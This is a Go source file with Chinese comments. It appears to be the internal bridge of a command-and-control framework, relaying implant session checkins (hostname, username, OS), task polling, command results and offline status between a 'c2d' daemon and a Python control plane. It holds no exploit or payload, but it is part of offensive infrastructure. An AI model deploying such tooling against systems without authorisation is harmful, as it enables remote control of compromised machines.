package main

// bridge — c2d 与 Python 控制面 (FastAPI) 的内部通信客户端
//
// 会话/任务状态全部在 Python 端 SQLite；c2d 每次会话事件回调这里。
import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

type Bridge struct {
	baseURL string
	token   string
	client  *http.Client
}

func NewBridge(baseURL, token string) *Bridge {
	return &Bridge{
		baseURL: baseURL,
		token:   token,
		client:  &http.Client{Timeout: 15 * time.Second},
	}
}

type CheckinRequest struct {
	ListenerID string `json:"listener_id"`
	RemoteAddr string `json:"remote_addr"`
	Hostname   string `json:"hostname"`
	Username   string `json:"username"`
	OsInfo     string `json:"os_info"`
	Reuse      bool   `json:"reuse"` // HTTP beacon 复用同源活跃会话；TCP/WS 每连接新建
}

type PollResult struct {
	TaskID  string `json:"task_id"`
	Command string `json:"command"`
}

func (b *Bridge) post(path string, body interface{}, out interface{}) error {
	data, err := json.Marshal(body)
	if err != nil {
		return err
	}
	req, err := http.NewRequest("POST", b.baseURL+path, bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+b.token)
	resp, err := b.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bridge %s -> HTTP %d: %s", path, resp.StatusCode, string(raw[:min(len(raw), 200)]))
	}
	if out != nil {
		return json.Unmarshal(raw, out)
	}
	return nil
}

// Checkin 注册或复用会话，返回 session_id
func (b *Bridge) Checkin(req CheckinRequest) (string, error) {
	var out struct {
		SessionID string `json:"session_id"`
	}
	if err := b.post("/api/c2/internal/sessions/checkin", req, &out); err != nil {
		return "", err
	}
	return out.SessionID, nil
}

// Poll 拉取一条待执行任务（Python 端标记 sent 并刷新会话活跃）
func (b *Bridge) Poll(sessionID string) (*PollResult, error) {
	var out PollResult
	if err := b.post("/api/c2/internal/sessions/"+sessionID+"/poll", map[string]string{}, &out); err != nil {
		return nil, err
	}
	if out.TaskID == "" {
		return nil, nil
	}
	return &out, nil
}

// Result 回写任务结果；taskID 为空时由 Python 端写入最近一条 sent 任务
func (b *Bridge) Result(sessionID, taskID, output string) error {
	return b.post("/api/c2/internal/sessions/"+sessionID+"/result",
		map[string]string{"task_id": taskID, "output": output}, nil)
}

// Dead 标记会话离线
func (b *Bridge) Dead(sessionID string) {
	_ = b.post("/api/c2/internal/sessions/"+sessionID+"/dead", map[string]string{}, nil)
}

// Meta 更新会话主机信息（WS register 消息）
func (b *Bridge) Meta(sessionID, hostname, username, osInfo string) error {
	return b.post("/api/c2/internal/sessions/"+sessionID+"/meta",
		map[string]string{"hostname": hostname, "username": username, "os_info": osInfo}, nil)
}
